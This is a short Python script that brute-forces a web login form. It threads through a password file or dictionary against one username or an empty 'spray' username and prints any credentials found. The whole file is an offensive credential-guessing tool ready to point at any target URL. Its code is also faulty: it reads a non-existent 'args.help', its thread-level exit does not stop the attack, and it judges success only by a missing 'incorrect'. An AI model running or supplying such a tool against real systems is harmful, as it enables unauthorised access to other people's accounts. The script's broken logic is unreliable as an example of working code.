import requests
import argparse
import sys
import colorama
from colorama import Fore, Style
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor


def try_credentials(username, password, target_url):
    session = requests.Session()
    response = session.post(target_url, data={
        'username': username,
        'password': password,
        'Login': 'submit'
    })

    if 'incorrect' not in response.text.lower():
        print(
            Fore.GREEN + f'[+] Found credentials: {username}:{password}' + Style.RESET_ALL)
        sys.exit(0)
    else:
        print(
            Fore.RED + f'[+] Wrong password: {username}:{password}' + Style.RESET_ALL)


if __name__ == '__main__':
    colorama.init()

    parser = argparse.ArgumentParser(description='Bruteforce script')
    parser.add_argument('target', help='Target URL')
    parser.add_argument('-u', '--username', default='',
                        help='The username to use for the attack')
    parser.add_argument('-p', '--passwords', help='The file containing passwords (one per line)')
    parser.add_argument('-d', '--dictionary', action='store_true',
                        help='Enable dictionary attack mode.')
    parser.add_argument('-s', '--spray', action='store_true',
                        help='Enable password spray attack mode.')
    parser.add_argument('-t', '--threads', type=int, default=10,
                        help='Number of threads to use for the attack')
    args = parser.parse_args()

    if args.help:
        parser.print_help()
        sys.exit(0)

    if not args.passwords and not args.dictionary:
        print(
            Fore.RED + '[-] Please provide either a passwords file or enable dictionary mode.' + Style.RESET_ALL)
        sys.exit(1)

    if args.passwords:
        with open(args.passwords, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = f.read().splitlines()
    elif args.dictionary:
        with open('dictionary.txt', 'r', encoding='utf-8', errors='ignore') as f:
            passwords = f.read().splitlines()

    if not args.username and not args.spray:
        print(Fore.RED + '[-] Please provide a username or enable password spray mode.' + Style.RESET_ALL)
        sys.exit(1)
    elif not args.username:
        print(colorama.Fore.YELLOW + '[!] No username provided. Performing password spray attack.' + colorama.Style.RESET_ALL)
        usernames = ['']
    else:
        usernames = [args.username]

    progress_bar = tqdm(total=len(usernames) * len(passwords),
                        desc='Progress', position=0, leave=True)

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        for username in usernames:
            if args.spray:
                for password in passwords:
                    executor.submit(try_credentials, username,
                                    password, args.target)
                    progress_bar.update(1)
            else:
                for password in passwords:
                    executor.submit(try_credentials, username,
                                    password, args.target)
                    progress_bar.update(1)

    progress_bar.close()

    # If no valid credentials found
    print(Fore.YELLOW +
          '[*] Unable to find valid credentials.' + Style.RESET_ALL)
